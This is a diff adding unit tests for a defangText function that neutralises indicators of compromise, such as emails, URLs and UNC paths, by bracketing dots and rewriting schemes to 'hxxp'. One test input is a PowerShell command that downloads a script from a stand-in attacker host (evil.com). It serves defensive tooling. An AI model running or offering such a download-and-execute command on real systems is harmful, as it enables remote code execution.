@@ -333,3 +333,24 @@ describe('defangText (right-click Defang)', () => {
     expect(performance.now() - start).toBeLessThan(1500)
   })
 })
+
+describe('defangText on a sentence that holds indicators', () => {
+  it('defangs each indicator in it and leaves the prose, the scheme included', () => {
+    expect(
+      defangText(
+        'User received an email from amelia.hart@lawson-rowe-review.com asking to open http://lawson-rowe-review.com/review/disclosure-schedule.'
+      )
+    ).toBe(
+      'User received an email from amelia[.]hart[at]lawson-rowe-review[.]com asking to open hxxp://lawson-rowe-review[.]com/review/disclosure-schedule.'
+    )
+    // A label in front used to make the whole sentence one value: every dot bracketed, the scheme left live.
+    expect(defangText('Execution: powershell.exe -c iwr https://evil.com/a.ps1')).toBe(
+      'Execution: powershell.exe -c iwr hxxps://evil[.]com/a[.]ps1'
+    )
+  })
+
+  it('still defangs a line that is one indicator, and a UNC path with spaces', () => {
+    expect(defangText('http://evil.com/a')).toBe('hxxp://evil[.]com/a')
+    expect(defangText('\\\\server\\share name\\x.exe')).toBe('[\\\\]server\\share name\\x[.]exe')
+  })
+})
